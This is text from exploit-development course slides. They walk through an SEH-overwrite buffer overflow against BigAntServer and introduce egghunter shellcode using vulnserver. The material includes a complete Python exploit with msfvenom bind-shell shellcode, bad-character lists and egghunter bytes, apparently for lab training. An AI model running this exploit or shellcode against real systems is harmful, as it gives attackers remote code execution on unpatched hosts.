XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Since we are exploiting the exception handler, we will have 
to pass the exception to the program – this way, the 
exception will be „handled”. Before we do this, let’s check 
the SEH chain by using Immunity’s View -> SEH chain
option.
2.2.1 SEH Crashing and Debugging
|  p.34
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
It seems that the SEH was overwritten. If you scroll down 
the stack, you should be able to see that Immunity marked 
the place where the exception handler resides on the stack. 
It was overwritten with our data.
2.2.1 SEH Crashing and Debugging
|  p.35
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Since we are now sure that the exception handler was 
overwritten with our controlled data, let’s allow it to work by 
pressing Shift + F9.
2.2.1 SEH Crashing and Debugging
|  p.36
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The program tried to execute 0x41414141, which is the 
equivalent of AAAA. So it was confirmed that we can 
control the EIP via the Structured Exception Handler 
overwrite.
Since the SEH value was 0x41414141, upon passing the 
exception to the program (handling it), the execution was 
moved to 0x41414141, which is an invalid address, so we 
were presented with a crash.
2.2.1 SEH Crashing and Debugging
|  p.37
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s head to the second step and calculate how may 
characters are exactly needed to reach the exception 
handler record so we can precisely overwrite it with data. 
2.2.2 SEH – Calculating the Offset
|  p.38
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We can generate the proper pattern using mona:
It should be noted, that the pattern is too long to fit into the 
console. If you want to copy it into the exploit, you should 
look for the pattern.txt file in: 
C:\Program Files\Immunity Inc\Immunity Debugger
2.2.2 SEH – Calculating the Offset
|  p.39
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s paste the pattern into the exploit. We’ll then exit 
immunity and restart the Antserver, reattaching immunity 
dbg to it. Remember that we will do this after every crash.
2.2.2 SEH – Calculating the Offset
|  p.40
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After launching the exploit we will again land in the 
exception handler. This time, we will not stop here, instead
we will pass the exception to the program using Shift + F9.
2.2.2 SEH – Calculating the Offset
|  p.41
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Once the access violation is reached, we will use mona to 
detect the EIP value for the offset.
2.2.2 SEH – Calculating the Offset
|  p.42
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
What does position 966 mean?
• The current EIP, so the SEH, is getting overwritten after 
966 bytes of the buffer.
• But, there’s a SEH pointer before it, which is 4 bytes long. 
We are essentially starting to overwrite the SEH structure 
after 962 bytes (966-4).
2.2.2 SEH – Calculating the Offset
|  p.43
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s apply those changes to the exploit.
2.2.2 SEH – Calculating the Offset
|  p.44
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After the usual application restart and debugger reattach, 
let’s launch the latest exploit against Antserver.
2.2.2 SEH – Calculating the Offset
|  p.45
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We do not need to follow the exception this time, since 
doing so will not provide us with any additional information. 
The entry depicted in the previous slide, located down the 
stack, is proof that we were able to overwrite the SEH 
structure.
• nSEH was overwritten with 0x42424242 (BBBB)
• SEH was overwritten with 0x43434343 (CCCC)
Moreover, we have lot of space for future shellcode past 
the exception handler structure.
2.2.2 SEH – Calculating the Offset
|  p.46
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Now, as previously mentioned, we need to find the “pop pop 
ret” gadget to transfer the execution from the SEH to the 
nSEH. This can be done through mona.py using the !mona 
seh command within the Immunity Debugger.
2.2.3 SEH – Finding POP POP RET
|  p.47
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
All the gadgets will be found in mona’s logfile – seh.txt:
C:\Program Files\Immunity Inc\Immunity Debugger
2.2.3 SEH – Finding POP POP RET
|  p.48
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
It is recommended to choose from gadgets that end with a 
clear return (so not RET 0x10 for example). Also, do not 
choose gadgets from a DLL that has a Rebase flag set to 
True. 
Rebase is a DLL feature that allows it to be re-located in 
case another DLL is already occupying the memory address 
where it was planned to be loaded. It is like dealing with 
ASLR, since its base address will not be predictable.
2.2.3 SEH – Finding POP POP RET
|  p.49
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After choosing one of the available addresses, we update 
the exploit. Remember that due to the endianness, the 
address should be written in reverse order.
2.2.3 SEH – Finding POP POP RET
|  p.50
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s launch the exploit against the server again. We don’t 
pass the exception to the program immediately, instead, 
let’s inspect the exception handler in detail.
If we now scroll down the stack until the SEH structure is 
found, we can right click on the address and click “Follow in 
Disassembler”.
2.2.3 SEH – Finding POP POP RET
|  p.51
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The disassembly dump shows that the address contains 
the proper instructions. 
Let’s right click on the first „POP”, and choose Breakpoint -
> Memory, on access.
2.2.3 SEH – Finding POP POP RET
|  p.52
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Setting the breakpoint looks as follows.
2.2.3 SEH – Finding POP POP RET
|  p.53
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Now, let’s pass the exception to the program using 
Shift+F9. 
The breakpoint should be triggered.
2.2.3 SEH – Finding POP POP RET
|  p.54
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Let’s now use the “Step into (F7)” functionality to walk the 
POP-POP-RET chain. After first pressing F7, we will execute 
the second “POP” instruction.
2.2.3 SEH – Finding POP POP RET
|  p.55
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After the second „POP”, we land on the “RET”:
2.2.3 SEH – Finding POP POP RET
|  p.56
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
As you already know, the RET instruction transfers the 
execution to the stack. Let’s check what is currently in the 
stack, by going to the “Registers” window, right clicking on 
the ESP and selecting Follow in Stack.
2.2.3 SEH – Finding POP POP RET
|  p.57
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We’ll then go to the stack window. We are sure that the first 
entry is the address on top of the stack (the one we will 
jump to using the “RET” instruction). Let’s right click on the 
top stack address and click “Follow in Dump”.
2.2.3 SEH – Finding POP POP RET
|  p.58
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We see that this position of the stack points to our “BBBB” 
– so to the nSEH pointer!
2.2.3 SEH – Finding POP POP RET
|  p.59
Let’s “Step Into” one more time.
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We start to execute the opcode equivalent of B (0x42). It is 
interpreted as INC EDX. This means, we can start to 
execute arbitrary code in that place.
Now, we will replace the instructions with breakpoints. The 
breakpoint instruction, also known as INT3, can be written 
using the 0xcc byte. 
2.2.3 SEH – Finding POP POP RET
|  p.60
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
This time, after relaunching the application and the latest
exploit, the exception can be immediately passed to the 
program, as no more SEH inspection is needed.
2.2.3 SEH – Finding POP POP RET
|  p.61
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
We landed in the breakpoints and started to execute them. 
Since we have a lot of space after the overwritten SEH 
structure, we can perform a short jump to land directly after 
it. 
2.2.3 SEH – Finding POP POP RET
|  p.62
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
This jump, a 6-bytes-forward one, can be performed using 
instructions:
• EB 06
Eventually, it can be padded to 4 bytes by 2 nops, resulting 
in the following the buffer shape.
2.2.3 SEH – Finding POP POP RET
|  p.63
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
A breakpoint was also added in order to stop the execution 
as soon as we jump over the SEH structure.
It seems that we successfully jumped over the SEH 
structure and we are now executing the shellcode part.
2.2.3 SEH – Finding POP POP RET
|  p.64
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Before we implement real shellcode here, let’s try to detect 
bad characters. We will try the usual buffer of all ASCII 
characters.
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
|  p.65
2.2.4 SEH – Detecting Bad Characters
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Below we can see the current shape of the exploit.
2.2.4 SEH – Detecting Bad Characters
|  p.66
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After relaunching it we see that the ASCII table has 
completely broken this exploit. We cannot use this 
character set right now, but we can guess what characters 
caused the break. Since the CRLF is interpreted as the end 
of the line, we can exclude bytes “\x0a” and “\x0d” from the 
buffer and relaunch the exploit.
2.2.4 SEH – Detecting Bad Characters
|  p.67
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
After removing the 0x0a and 0x0d, the buffer is still not 
okay.
2.2.4 SEH – Detecting Bad Characters
|  p.68
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The next character that was altered is “\x25”. Let’s remove 
it and relaunch the exploit.
2.2.4 SEH – Detecting Bad Characters
|  p.69
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Finally, after some trial and error the last bad character is found: 0x20.
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
"\x1a\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x26\x27"
"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5
f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7
e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9
e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xb
e\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xd
e\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xf
e\xff")
#badchars 0x0a 0x00 0x0d 0x20 0x25 
|  p.70
2.2.4 SEH – Detecting Bad Characters
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
In case of this exploit, a bind-
tcp shellcode was added. It 
was generated on an old 
version of metasploit, as the 
latest one caused compatiblity 
issues.
The command is still the 
same:
msfvenom –p windows/shell_bind_tcp 
exitfunc=thread –b „\x00\x0a\x0d\x20\x25”
sc = 
("\xb8\x32\x57\xbd\x31\x2b\xc9\xb1\x51\xda\xcf\xd9\x74\x24\xf4\x5a"
"\x31\x42\x0e\x83\xc2\x04\x03\x70\x5d\x5f\xc4\x88\x0b\x74\x6a\x98"
"\x35\x75\x8a\xa7\xa6\x01\x19\x73\x03\x9d\xa7\x47\xc0\xdd\x22\xcf"
"\xd7\xf2\xa6\x60\xc0\x87\xe6\x5e\xf1\x7c\x51\x15\xc5\x09\x63\xc7"
"\x17\xce\xfd\xbb\xdc\x0e\x89\xc4\x1d\x44\x7f\xcb\x5f\xb2\x74\xf0"
"\x0b\x61\x5d\x73\x51\xe2\xc2\x5f\x98\x1e\x9a\x14\x96\xab\xe8\x75"
"\xbb\x2a\x04\x8a\xef\xa7\x53\xe0\xcb\xab\x02\x3b\x22\x0f\xa0\x30"
"\x06\x9f\xa2\x06\x85\x54\xc4\x9a\x38\xe1\x65\xaa\x1c\x9e\xeb\xe4"
"\xae\xb2\xa4\x07\x78\x2c\x16\x91\xed\x82\xaa\x35\x99\x97\xf8\x9a"
"\x31\xa7\x2d\x4c\x71\xba\x32\xb7\xd5\xba\x1d\x98\x5c\xa1\xc4\xa7"
"\xb2\x22\x0b\xf2\x26\x31\xf4\x2c\xde\xec\x03\x39\xb2\x58\xeb\x17"
"\x9e\x35\x40\xc4\x72\xf9\x35\xa9\x27\x02\x69\x4b\xa0\xed\xd6\xf5"
"\x63\x87\x06\x6c\xeb\x33\xd2\xfe\x2b\x6c\x1c\x28\xd9\x83\xb3\x81"
"\xe1\x74\x5b\x8d\xb3\x5b\x75\x9a\x34\x75\xd6\x71\x34\xaa\xb1\x9c"
"\x83\xcd\x0b\x09\xeb\x04\xdb\xe1\x47\xfc\x23\xd9\xfb\x96\x3c\xa0"
"\x3d\x1f\x94\xad\x14\xb5\xe5\x81\xff\x5c\x7e\x47\x68\xc2\x13\x0e"
"\x8d\x6e\xbc\x49\x67\xa3\xb5\x8e\x1d\x7f\x4f\xb2\xd3\xbf\xbc\x98"
"\xea\x02\x6e\x22\x50\xaf\xe3\x57\x2f\x97\xa8\xcc\x7b\x8f\xdc\xec"
"\xcf\x46\xde\x65\x74\x98\xf6\xde\x23\x34\xa6\xb1\x9a\xd2\x49\x60"
"\x4c\x76\x1b\x7d\xbe\x10\x36\x58\x3a\x2f\x1b\xa5\x93\xc5\x63\xa6"
"\x2b\xe5\x4c\xd3\x03\xe5\xee\x27\xcf\xea\x27\xf5\xef\xc5\xa0\x87"
"\xd7\x04\x43\x24\x17\x1e\x5b\x1a")
|  p.71
2.2.5 SEH – Adding Shellcode
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
The new shellcode can now be incorporated into the 
exploit. The place where the badchars table resided was 
padded for convenience with 4 nops.
2.2.5 SEH – Adding Shellcode
|  p.72
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Relaunching the application, this time outside of the 
debugger, and attacking it with the latest exploit results in a 
bind shell being opened.
2.2.5 SEH – Adding Shellcode
|  p.73
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
On the following slides, you will find the exploit code.
2.2.5 SEH – Adding Shellcode
|  p.74
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
import sys, socket
#badchars 0x0a 0x00 0x0d 0x20 0x25 
sc = ("\xb8\x32\x57\xbd\x31\x2b\xc9\xb1\x51\xda\xcf\xd9\x74\x24\xf4\x5a"
"\x31\x42\x0e\x83\xc2\x04\x03\x70\x5d\x5f\xc4\x88\x0b\x74\x6a\x98"
"\x35\x75\x8a\xa7\xa6\x01\x19\x73\x03\x9d\xa7\x47\xc0\xdd\x22\xcf"
"\xd7\xf2\xa6\x60\xc0\x87\xe6\x5e\xf1\x7c\x51\x15\xc5\x09\x63\xc7"
"\x17\xce\xfd\xbb\xdc\x0e\x89\xc4\x1d\x44\x7f\xcb\x5f\xb2\x74\xf0"
"\x0b\x61\x5d\x73\x51\xe2\xc2\x5f\x98\x1e\x9a\x14\x96\xab\xe8\x75"
"\xbb\x2a\x04\x8a\xef\xa7\x53\xe0\xcb\xab\x02\x3b\x22\x0f\xa0\x30"
"\x06\x9f\xa2\x06\x85\x54\xc4\x9a\x38\xe1\x65\xaa\x1c\x9e\xeb\xe4"
"\xae\xb2\xa4\x07\x78\x2c\x16\x91\xed\x82\xaa\x35\x99\x97\xf8\x9a"
"\x31\xa7\x2d\x4c\x71\xba\x32\xb7\xd5\xba\x1d\x98\x5c\xa1\xc4\xa7"
"\xb2\x22\x0b\xf2\x26\x31\xf4\x2c\xde\xec\x03\x39\xb2\x58\xeb\x17"
"\x9e\x35\x40\xc4\x72\xf9\x35\xa9\x27\x02\x69\x4b\xa0\xed\xd6\xf5"
"\x63\x87\x06\x6c\xeb\x33\xd2\xfe\x2b\x6c\x1c\x28\xd9\x83\xb3\x81"
"\xe1\x74\x5b\x8d\xb3\x5b\x75\x9a\x34\x75\xd6\x71\x34\xaa\xb1\x9c"
"\x83\xcd\x0b\x09\xeb\x04\xdb\xe1\x47\xfc\x23\xd9\xfb\x96\x3c\xa0"
"\x3d\x1f\x94\xad\x14\xb5\xe5\x81\xff\x5c\x7e\x47\x68\xc2\x13\x0e"
"\x8d\x6e\xbc\x49\x67\xa3\xb5\x8e\x1d\x7f\x4f\xb2\xd3\xbf\xbc\x98"
"\xea\x02\x6e\x22\x50\xaf\xe3\x57\x2f\x97\xa8\xcc\x7b\x8f\xdc\xec"
"\xcf\x46\xde\x65\x74\x98\xf6\xde\x23\x34\xa6\xb1\x9a\xd2\x49\x60"
"\x4c\x76\x1b\x7d\xbe\x10\x36\x58\x3a\x2f\x1b\xa5\x93\xc5\x63\xa6"
"\x2b\xe5\x4c\xd3\x03\xe5\xee\x27\xcf\xea\x27\xf5\xef\xc5\xa0\x87"
"\xd7\x04\x43\x24\x17\x1e\x5b\x1a")
|  p.75
2.2.5.1 SEH – Exploit Code
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
target = "127.0.0.1"
port = 6660
buff = "A"*962
buff += "\xeb\x06\x90\x90" #nSEH
buff += "\xb9\x44\x81\x1b"
buff += "\x90"*4 #Shellcode placeholder
buff += sc
buff += "D"*(2500-len(buff))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((target, port))
s.send('USV ' + buff + '\r\n\r\n')
s.close()
|  p.76
2.2.5.1 SEH – Exploit Code
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. There are some 
interesting labs up next! 
|  p.77
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will go through 
the whole process of identifying 
and exploiting an SEH-based 
stack overflow vulnerability on a 
Windows system, from 
overwriting the SEH and 
identifying bad characters to 
jumping to the shellcode.
Windows SEH Overflow 
(MP3 Studio)
|  p.78
Hera Lab #1
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will go 
through the whole process 
of identifying and exploiting 
an SEH-based stack 
overflow vulnerability on a 
Windows system.
Windows SEH Overflow 
(EasyChat)
|  p.79
Hera Lab #2
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
References
|  p.80
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
References
Using SHORT (Two-byte) Relative Jump Instructions
BigAntServer_Enu_Setup.zip
SEH Stack Based Windows Buffer Overview Tutorial
https://thestarman.pcministry.com/asm/2bytejumps.htm
https://sites.google.com/site/lupingreycorner/BigAntServer_Enu_Setup.zip?attredirects=0
http://www.thegreycorner.com/2010/01/seh-stack-based-windows-buffer-overflow.html
|  p.81
XDSv1: Section 2, Module 2 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Windows SEH Overflow (MP3 Studio)
In this lab, you will go through the whole process of identifying and 
exploiting an SEH-based stack overflow vulnerability on a Windows 
system, from overwriting the SEH and identifying bad characters to 
jumping to the shellcode.
Windows SEH Overflow (EasyChat)
In this lab, you will go through the whole process of identifying and 
exploiting an SEH-based stack overflow vulnerability on a Windows 
system.
|  p.82
© Caendra Inc. 2019
All Rights Reserved
Windows Egghunting
S e c t i o n  0 2  |  M o d u l e  0 3
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Table of Contents
MODULE 03 | WINDOWS EGGHUNTING
3.1 Egghunter Exploits
3.2 Vulnserver Egghunter Exploit
|   p.2
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
What egghunter-based exploits are
How to bypass limited buffer space during exploitation
How to take advantage of alternative channels to 
deliver your shellcode
|   p.3
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
3.1
Egghunter Exploits
|  p.4
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
During a buffer overflow attack, sometimes the whole 
buffer is not allocated in its original shape inside the target
program’s memory.
You already know that some character transformations 
may occur. However, the transformations are not only 
limited to characters. Sometimes, whole memory chunks 
might be relocated for unknown reasons.
3.1 Egghunter Exploits
|  p.5
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
It is not uncommon that upon overflowing a buffer most of 
your payload buffer is allocated in a random part of the 
memory.
Also, sometimes the buffer is truncated, and it is thus not 
possible to fit your shellcode in the available space.
3.1 Egghunter Exploits
|  p.6
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
In such situations, it is often possible to deliver the 
shellcode to the program’s memory using another channel. 
For example, another form of input via a different 
functionality than the attacked one.
Many applications tend to store user input in their memory 
for longer than needed. Abusing this fact, we can deliver the 
shellcode to the application that truncates the payload.
3.1 Egghunter Exploits
|  p.7
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
However, the remaining dilemma is how to reference the 
shellcode that was delivered via an alternative channel?
Egghunter shellcode, or simply egghunter, is a specific type 
of (small-sized) shellcode that can be used when a user’s 
buffer is split and allocated in an unknown part of memory 
during an overflow.
3.1 Egghunter Exploits
|  p.8
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Egghunter shellcode can search the whole address space of a 
process, looking for a specific set of bytes, In case this specific 
set of bytes is found, the egghunter will move the execution flow 
to the space they reside. Moreover, it is around 40 bytes and can 
perfectly fit the situation when parts of the user buffer are
mangled or truncated. 
The egg, is essentially the shellcode that will look for the larger 
part of the shellcode, which can be distinguished from the rest of 
the memory contents by a special marker at its beginning. Let’s 
go through a real example of an egghunter shellcode to better 
understand how it works.
3.1 Egghunter Exploits
|  p.9
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The egghunter shellcode relies system calls that have the 
ability to traverse process memory. As there are few 
system calls on Windows that offer such functionality, 
egghunters can be written in a few possible ways.  
3.1 Egghunter Exploits
|  p.10
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
A security researcher using the internet handle „Skape” has 
discovered and documented several methods to create an 
egghunter in a whitepaper. You can read it in the following 
link: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
We will analyze two popular egghunter shellcodes.
3.1 Egghunter Exploits
|  p.11
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
NtDisplayString (32 bytes shellcode)
That shellcode loops through the pages of the process’s 
memory and uses NtDisplayString to check if the marker 
tag was spotted. If so, the execution is transferred to that
place. NtDisplayString is used to display a string, and takes
a pointer to it as an argument. Based on its return value 
(was the pointer found), it is possible to know if the marker 
tag was found or not.
3.1 Egghunter Exploits
|  p.12
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The function will be used in order to find a user-chosen 
“egg”, also called a “marker” or “tag”, which consists of 4 
bytes of choice. Those 4 bytes have to be specified in the 
egghunter shellcode, but they also have to reside at the 
beginning of the second part of the shellcode. 
Since there are various random bytes in the memory 
generated at runtime, it is not impossible that somewhere 
in the memory some bytes have already formed the same 4-
byte pattern.
3.1 Egghunter Exploits
|  p.13
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
In order to avoid such confusions, the egghunter shellcode 
will check for the marker tag twice. 
Only if it is found twice in a row, the execution will be 
transferred right after those marker tags.
3.1 Egghunter Exploits
|  p.14
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The Assembly’s 
implementation of the 
NtDisplayString egghunter 
shellcode looks like the 
following.
6681CAFF0F or dx,0xfff ; get last address in page
42 inc edx ; increments the value in EDX by 1
52 push edx ; pushes edx value to the stack
; (saves the current address on the stack)
6A43 push byte +0x43 ; push 0x43 for NtDisplayString to stack
58 pop eax ; pop 0x2 or 0x43 into eax
; so it can be used as parameter to syscall
CD2E int 0x2e ; call the nt!NtDisplayString kernel function
3C05 cmp al,0x5 ; check if access violation occurs
; (0xc0000005 == ACCESS_VIOLATION) 5
5A pop edx ; restore edx
74EF jz 0x0 ; jmp back to start dx 0x0fffff
B890509050 mov eax,0x50905090 ; this is the tag (egg) “w00t”
8BFA mov edi,edx ; set edi to our pointer
AF scads ; compare the dword in edi to eax
75EA jnz 0x5 ; (back to inc edx) check egg found or not 
AF scads ; when egg has been found
75E7 jnz 0x5 ; jump back to "inc edx"
; if only the first egg was found
FFE7 jmp edi ; edi points to the shellcode 
|  p.15
3.1 Egghunter Exploits
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
It can be translated into the following sequence of bytes.
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
+ "\xef\xb8" + "\x90\x50\x90\x50" + 
"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
|  p.16
3.1 Egghunter Exploits
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Of course, you do not need to remember this shellcode. 
Egghunter shellcodes can be found on the web, depending 
on the architecture or OS version. 
3.1 Egghunter Exploits
|  p.17
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Additionally, an egghunter can be generated using mona. 
When inside Immunity Dbg, issue following command.
The –t option specifies the marker tag which will be later 
referenced by the egghunter shellcode to find the second-
stage payload.
!mona egg -t w00t
|  p.18
3.1 Egghunter Exploits
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
3.2
Vulnserver 
Egghunter Exploit
|  p.19
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Let’s try to investigate a buffer overflow vulnerability in a 
purposely-vulnerable application - vulnserver.
You can download vulnserver from the link below.
https://sites.google.com/site/lupingreycorner/vulnserver.zi
p?attredirects=0
3.2 Exploit Setup
|  p.20
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Vulnserver is a TCP server that accepts numerous 
commands with an argument. Each command can be 
exploited in a different way. In the upcoming walkthrough, 
we will focus on exploiting vulnserver using an egghunter 
shellcode.
This time we will focus just on the exploitation part. Let’s 
start with an exploit skeleton – an overflow in the 
vulnerable “KSTET” method.
3.2 Exploit Setup
|  p.21
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The complete exploit code will be available at the end of this  
exercise; this is what was used to make the application crash.
3.2.1 Vulnserver Debugging
|  p.22
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
We will start with confirming the crash. First, vulnserver 
must be run through Immunity Debugger in order to have a 
clear view on what is happening in the memory.
3.2.1 Vulnserver Debugging
|  p.23
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After launching the exploit at the vulnserver instance, we 
notice that a crash with a vanilla EIP overwrite occurred.
3.2.1 Vulnserver Debugging
|  p.24
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The first step, as usual in such a case, will be to determine 
the exact buffer length required to overflow the EIP. Using 
mona.py, we can generate the pattern, as follows.
3.2.1 Vulnserver Debugging
|  p.25
And paste it into the exploit.
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Launching the exploit with the newly created buffer causes 
the vulnserver to crash. Using mona, we are able to figure 
out the offset to EIP (see next slide).
3.2.1 Vulnserver Debugging
|  p.26
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
It seems that EIP gets overwritten after 70 bytes of junk 
buffer. Let’s confirm that; we’ll also restructure the exploit a 
bit.
3.2.1 Vulnserver Debugging
|  p.27
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019 |  p.28
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After launching the latest exploit, we can see what the 
memory looks like after the crash.
3.2.1 Vulnserver Debugging
|  p.29
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
We can conclude the following:
• EIP was overwritten after 70 bytes and it is a vanilla EIP 
overwrite.
